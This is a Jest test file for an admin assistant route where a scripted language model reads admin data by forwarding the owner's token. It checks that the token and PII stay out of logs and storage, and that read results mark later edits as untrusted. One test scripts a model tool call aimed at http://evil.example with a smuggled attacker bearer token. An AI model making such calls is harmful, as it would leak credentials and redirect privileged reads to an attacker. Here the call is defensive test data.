/**
 * POST /admin/intelligence-bar/query with the general admin read (owner
 * ruling 2026-10-12): the route puts the request's own Authorization on the
 * action context, the tool forwards it on a loopback GET, and the token is in
 * no persisted query row, tool event or task checkpoint, no log line and no
 * tool result sent back to the model. A login without full access never gets
 * the tools, and the legacy tool list never carries them.
 *
 * Harness (mocks + helpers) mirrors admin-intelligence-bar-empty-reply-ledger.test.js.
 */
process.env.JWT_SECRET = process.env.JWT_SECRET || 'test-jwt-secret';
process.env.ANTHROPIC_API_KEY = 'test-key';
process.env.GATE_IB_PLATFORM = 'true';
process.env.GATE_IB_GENERAL_READ = 'true';

const mockMessagesCreate = jest.fn();
const mockInsert = jest.fn(async () => undefined);
const mockCheckpoint = jest.fn(async () => undefined);
const mockToolEvent = jest.fn();

jest.mock('@anthropic-ai/sdk', () => jest.fn().mockImplementation(() => ({
  messages: { create: (...args) => mockMessagesCreate(...args) },
})));

jest.mock('../models/db', () => jest.fn(() => ({ insert: (...args) => mockInsert(...args) })));
jest.mock('../services/logger', () => ({ info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() }));
jest.mock('../services/intelligence-bar/circuit-breaker', () => ({
  getBreaker: jest.fn(() => ({
    isTripped: jest.fn(() => false), fastFailResult: jest.fn(), recordFailure: jest.fn(), recordSuccess: jest.fn(),
  })),
}));
jest.mock('../services/intelligence-bar/tool-events', () => ({ recordToolEvent: (...args) => mockToolEvent(...args) }));
jest.mock('../config/models', () => ({ FLAGSHIP: 'test-model' }));
jest.mock('../services/intelligence-bar/tasks', () => ({
  begin: jest.fn(async () => ({ created: true, task: { id: 'task-1', runner_token: 'runner-1', state: 'running', session_id: 'session-1' } })),
  checkpoint: (...args) => mockCheckpoint(...args),
  get: jest.fn(async () => ({ id: 'task-1', state: 'completed' })),
  snapshot: jest.fn(async () => ({ response: 'snapshot' })),
  list: jest.fn(async () => []),
  requestStartedAt: jest.fn(() => new Date('2026-10-12T12:00:00Z')),
  claimResume: jest.fn(async () => null),
}));
jest.mock('../services/intelligence-bar/task-context', () => {
  const actual = jest.requireActual('../services/intelligence-bar/task-context');
  return {
    ...actual,
    resolve: jest.fn(async () => ({ targets: [], target: null, ambiguous: false, candidates: [], page: { ids: {}, records: {} }, requestedRecords: {} })),
    prepareReadInput: jest.fn(async (input) => ({ input })),
  };
});
jest.mock('../services/inspection-credit', () => ({ projectRedeemableOfferAmount: jest.fn(async () => ({ amount: 0 })) }));
jest.mock('../middleware/admin-auth', () => ({
  adminAuthenticate: (req, res, next) => {
    const token = String(req.headers.authorization || '').replace(/^Bearer\s+/i, '');
    const logins = {
      'owner-token-abcdef': { id: 'admin-1', role: 'admin', email: 'contact@wavespestcontrol.com' },
      'other-admin-token-abcdef': { id: 'admin-2', role: 'admin', email: 'office@example.test' },
    };
    const tech = logins[token];
    if (!tech) return res.status(401).json({ error: 'Admin authentication required' });
    req.technician = tech;
    req.technicianId = tech.id;
    req.techRole = tech.role;
    return next();
  },
  requireTechOrAdmin: (req, res, next) => (req.techRole === 'admin' ? next() : res.status(403).json({ error: 'Staff access required' })),
  requireAdmin: (req, res, next) => (req.techRole === 'admin' ? next() : res.status(403).json({ error: 'Admin access required' })),
}));
jest.mock('../services/llm-dispatch-metrics', () => {
  const actual = jest.requireActual('../services/llm-dispatch-metrics');
  return { ...actual, ledgerCallRejected: jest.fn() };
});

const express = require('express');
const config = require('../config');
const logger = require('../services/logger');
const { ADMIN_READ_HEADER } = require('../utils/redact-request-url');
const catalog = require('../services/intelligence-bar/admin-read-catalog.json');
const intelligenceRouter = require('../routes/admin-intelligence-bar');

const OWNER = 'Bearer owner-token-abcdef';
const OTHER_ADMIN = 'Bearer other-admin-token-abcdef';
const ENTRY = catalog.entries.find(entry => entry.params.length === 1 && entry.paramKinds?.[entry.params[0]] !== 'text');
const ENTRY_VALUE = { uuid: '10000000-0000-4000-8000-00000000000a', int: '4821' }[ENTRY.paramKinds[ENTRY.params[0]]];
const LOOPBACK = `http://127.0.0.1:${Number(config.port)}/api/`;
const realFetch = global.fetch;

function appServer() {
  const app = express();
  app.use(express.json({ limit: '10mb' }));
  app.use('/admin/intelligence-bar', intelligenceRouter);
  app.use((err, _req, res, _next) => res.status(err.status || 500).json({ error: err.message }));
  const server = app.listen(0);
  return { server, baseUrl: `http://127.0.0.1:${server.address().port}` };
}

async function withServer(fn) {
  const { server, baseUrl } = appServer();
  try { return await fn(baseUrl); } finally { await new Promise(resolve => server.close(resolve)); }
}

async function postQuery(baseUrl, authorization, body) {
  const res = await realFetch(`${baseUrl}/admin/intelligence-bar/query`, {
    method: 'POST', headers: { Authorization: authorization, 'Content-Type': 'application/json' }, body: JSON.stringify(body),
  });
  return { status: res.status, body: await res.json() };
}

let loopbackCalls;
beforeEach(() => {
  jest.clearAllMocks();
  loopbackCalls = [];
  global.fetch = jest.fn(async (url, options) => {
    if (String(url).startsWith(LOOPBACK)) {
      loopbackCalls.push({ url: String(url), headers: { ...options.headers } });
      return {
        status: 200, headers: { get: key => ({ 'content-type': 'application/json' }[String(key).toLowerCase()] ?? null) },
        text: async () => JSON.stringify({ timeline: [{ id: 1, kind: 'visit' }] }),
      };
    }
    return realFetch(url, options);
  });
});
afterAll(() => { global.fetch = realFetch; });

const toolUse = (id, name, input) => ({ content: [{ type: 'tool_use', id, name, input }] });

function scriptModel(steps) {
  mockMessagesCreate.mockImplementation(async (request) => {
    const step = steps.shift();
    if (typeof step === 'function') return step(request);
    return step || { content: [{ type: 'text', text: 'Done.' }] };
  });
}

test('the owner login reads through the request token, and the token is stored and logged nowhere', async () => {
  const seen = [];
  scriptModel([
    toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
    (request) => { seen.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }); },
    { content: [{ type: 'text', text: 'The timeline has one visit.' }] },
  ]);
  await withServer(async (baseUrl) => {
    const { status, body } = await postQuery(baseUrl, OWNER, { prompt: 'what is on the admin screen for this', context: 'dashboard', session_id: 'session-1' });
    expect(status).toBe(200);
    expect(body).toBeDefined();
  });
  const delivered = mockCheckpoint.mock.calls.map(call => call[2]).find(update => update?.response);
  expect(JSON.stringify(delivered.response)).toContain('The timeline has one visit.');
  expect(seen[0]).toContain('read_admin_data');
  expect(loopbackCalls).toHaveLength(1);
  expect(loopbackCalls[0].headers.Authorization).toBe(OWNER);
  expect(new URL(loopbackCalls[0].url).pathname).toBe(`/api${ENTRY.endpoint.replace(`:${ENTRY.params[0]}`, ENTRY_VALUE)}`);
  expect(loopbackCalls[0].headers[ADMIN_READ_HEADER]).toMatch(/^1;p=\d+(,\d+)*$/);

  const stored = JSON.stringify({
    inserts: mockInsert.mock.calls, events: mockToolEvent.mock.calls, checkpoints: mockCheckpoint.mock.calls,
    logs: Object.values(logger).flatMap(fn => fn.mock.calls),
    modelRequests: mockMessagesCreate.mock.calls,
  });
  expect(stored).not.toContain('owner-token-abcdef');
  // The read did run and its result reached the model and the checkpoint.
  expect(stored).toContain('"kind":"visit"');
  expect(mockToolEvent.mock.calls.some(([event]) => event.toolName === 'read_admin_data' && event.success === true)).toBe(true);
  // The query row and the checkpoint carry field names, not the parameter values.
  expect(mockCheckpoint.mock.calls.length).toBeGreaterThan(0);
});

test('a model that smuggles its own token or URL gets nothing', async () => {
  scriptModel([
    toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
    toolUse('t2', 'read_admin_data', { endpoint: `http://evil.example/api${ENTRY.endpoint}`, staffAuthorization: 'Bearer attacker-token-attacker' }),
    toolUse('t3', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE }, staffAuthorization: 'Bearer attacker-token-attacker' }),
    { content: [{ type: 'text', text: 'Could not read it.' }] },
  ]);
  await withServer(async (baseUrl) => {
    const { status } = await postQuery(baseUrl, OWNER, { prompt: 'read the admin screen', context: 'dashboard', session_id: 'session-1' });
    expect(status).toBe(200);
  });
  expect(loopbackCalls).toHaveLength(0);
});

test('an admin login without full access never gets the tools or a read', async () => {
  const lists = [];
  scriptModel([
    (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }); },
    (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }); },
    { content: [{ type: 'text', text: 'No.' }] },
  ]);
  await withServer(async (baseUrl) => {
    const { status } = await postQuery(baseUrl, OTHER_ADMIN, { prompt: 'read the admin screen', context: 'dashboard', session_id: 'session-1' });
    expect(status).toBe(200);
  });
  for (const list of lists) {
    expect(list).not.toContain('read_admin_data');
    expect(list).not.toContain('find_admin_reads');
  }
  expect(loopbackCalls).toHaveLength(0);
});

test('with the gate off the owner login does not get the tools either', async () => {
  process.env.GATE_IB_GENERAL_READ = 'false';
  try {
    const lists = [];
    scriptModel([
      (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }); },
      (request) => { lists.push(request.tools.map(t => t.name)); return { content: [{ type: 'text', text: 'No.' }] }; },
    ]);
    await withServer(async (baseUrl) => {
      await postQuery(baseUrl, OWNER, { prompt: 'read the admin screen', context: 'dashboard', session_id: 'session-1' });
    });
    for (const list of lists) expect(list).not.toContain('read_admin_data');
    expect(loopbackCalls).toHaveLength(0);
  } finally {
    process.env.GATE_IB_GENERAL_READ = 'true';
  }
});

test('the tech rail refuses a forced call even on the owner login', async () => {
  scriptModel([
    toolUse('t1', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }),
    { content: [{ type: 'text', text: 'Refused.' }] },
  ]);
  await withServer(async (baseUrl) => {
    const { status } = await postQuery(baseUrl, OWNER, { prompt: 'read the admin screen', context: 'tech', session_id: 'session-1' });
    expect(status).toBe(200);
  });
  expect(loopbackCalls).toHaveLength(0);
});

test('the legacy tool list never offers them, whatever the login', () => {
  for (const context of ['customers', 'dashboard', 'ops', 'revenue', 'tech', 'agent_estimate']) {
    for (const [isAdmin, fullAccess] of [[true, true], [true, false], [false, false]]) {
      const names = intelligenceRouter.getToolsForContext(context, isAdmin, fullAccess).map(t => t.name);
      expect(names).not.toContain('read_admin_data');
      expect(names).not.toContain('find_admin_reads');
    }
  }
});

// Codex round 1 P1: the finder's free-form query can hold a name, phone or
// email, so find_admin_reads is a PII tool although its scope is none.
describe('find_admin_reads carries PII in its query', () => {
  const PHONE = '941-555-0100';
  const NAME = 'Zelda Syntheticname';
  // Query rows, tool events and log lines (the task checkpoint holds the live conversation and is outside this rule).
  const everythingKept = () => JSON.stringify({
    inserts: mockInsert.mock.calls, events: mockToolEvent.mock.calls,
    logs: Object.values(logger).flatMap(fn => fn.mock.calls),
  });

  test('a finder-only request stores and logs no query words', async () => {
    scriptModel([
      toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
      toolUse('t2', 'find_admin_reads', { query: `${NAME} ${PHONE} autopay` }),
      { content: [{ type: 'text', text: 'Found the autopay read.' }] },
    ]);
    await withServer(async (baseUrl) => {
      const { status } = await postQuery(baseUrl, OWNER, { prompt: `find the autopay screen data for ${NAME} ${PHONE}`, context: 'dashboard', session_id: 'session-1' });
      expect(status).toBe(200);
    });
    expect(mockToolEvent.mock.calls.some(([event]) => event.toolName === 'find_admin_reads')).toBe(true);
    const toolLog = logger.info.mock.calls.find(([message]) => message === '[intelligence-bar] Tool call: find_admin_reads');
    expect(toolLog[1]).toEqual({ fields: ['query'], confirmed: false });
    const queryRows = mockInsert.mock.calls.map(call => JSON.stringify(call));
    expect(queryRows.some(row => row.includes('redacted'))).toBe(true);
    expect(everythingKept()).not.toContain(PHONE);
    expect(everythingKept()).not.toContain(NAME);
  });

  test('/execute logs the field names, not the query words', async () => {
    await withServer(async (baseUrl) => {
      const res = await realFetch(`${baseUrl}/admin/intelligence-bar/execute`, {
        method: 'POST', headers: { Authorization: OWNER, 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'find_admin_reads', params: { query: `${NAME} ${PHONE} autopay` } }),
      });
      expect(res.status).toBe(200);
    });
    const executed = logger.info.mock.calls.find(([message]) => message === '[intelligence-bar] Executed action: find_admin_reads');
    expect(executed[1]).toEqual({ fields: ['query'] });
    expect(everythingKept()).not.toContain(PHONE);
    expect(everythingKept()).not.toContain(NAME);
  });
});

// Codex round 3 (security): after the general read returned data, the rest of
// the request cannot run an owner-direct edit without a card. The per-request
// flag is read where owner-direct plans each model message (the direct commit
// itself needs a database and is covered by the platform suite's gate).
describe('untrusted read data and owner-direct edits', () => {
  const OwnerDirect = require('../services/intelligence-bar/owner-direct');
  let seen;
  let spy;
  let gateBefore;
  beforeEach(() => {
    gateBefore = process.env.GATE_IB_OWNER_DIRECT;
    process.env.GATE_IB_OWNER_DIRECT = 'true';
    seen = [];
    const real = OwnerDirect.messageDirectPlan;
    spy = jest.spyOn(OwnerDirect, 'messageDirectPlan').mockImplementation((toolUses, isValid, taint) => {
      seen.push({ tools: toolUses.map(t => t.name), untrusted: taint?.untrustedRead === true });
      return real(toolUses, isValid, taint);
    });
  });
  afterEach(() => {
    spy.mockRestore();
    if (gateBefore === undefined) delete process.env.GATE_IB_OWNER_DIRECT; else process.env.GATE_IB_OWNER_DIRECT = gateBefore;
  });

  const edit = { customer_id: '10000000-0000-4000-8000-00000000000a', updates: { city: 'Bradenton' } };
  const run = async (steps) => {
    scriptModel(steps);
    await withServer(async (baseUrl) => {
      const { status } = await postQuery(baseUrl, OWNER, { prompt: 'check the admin screen then fix the city', context: 'dashboard', session_id: 'session-1' });
      expect(status).toBe(200);
    });
  };
  const readCall = id => toolUse(id, 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } });

  test('a read that returned data taints the rest of the request, and a later edit is planned with the flag', async () => {
    await run([
      toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
      readCall('t2'),
      toolUse('t3', 'update_customer', edit),
      { content: [{ type: 'text', text: 'Done.' }] },
    ]);
    expect(loopbackCalls).toHaveLength(1);
    const editRound = seen.find(entry => entry.tools.includes('update_customer'));
    expect(editRound.untrusted).toBe(true);
    expect(seen.find(entry => entry.tools.includes('read_admin_data')).untrusted).toBe(false);
  });

  test('without the read, the same edit is planned as before', async () => {
    await run([
      toolUse('t1', 'update_customer', edit),
      { content: [{ type: 'text', text: 'Done.' }] },
    ]);
    expect(seen.length).toBeGreaterThan(0);
    expect(seen.every(entry => entry.untrusted === false)).toBe(true);
  });

  test('a read that failed does not taint', async () => {
    global.fetch.mockImplementation(async (url, options) => {
      if (String(url).startsWith(LOOPBACK)) {
        loopbackCalls.push({ url: String(url), headers: { ...options.headers } });
        return { status: 404, headers: { get: key => ({ 'content-type': 'application/json' }[String(key).toLowerCase()] ?? null) }, text: async () => JSON.stringify({ error: 'Not found' }) };
      }
      return realFetch(url, options);
    });
    await run([
      toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
      readCall('t2'),
      toolUse('t3', 'update_customer', edit),
      { content: [{ type: 'text', text: 'Done.' }] },
    ]);
    expect(loopbackCalls).toHaveLength(1);
    expect(seen.find(entry => entry.tools.includes('update_customer')).untrusted).toBe(false);
  });
});
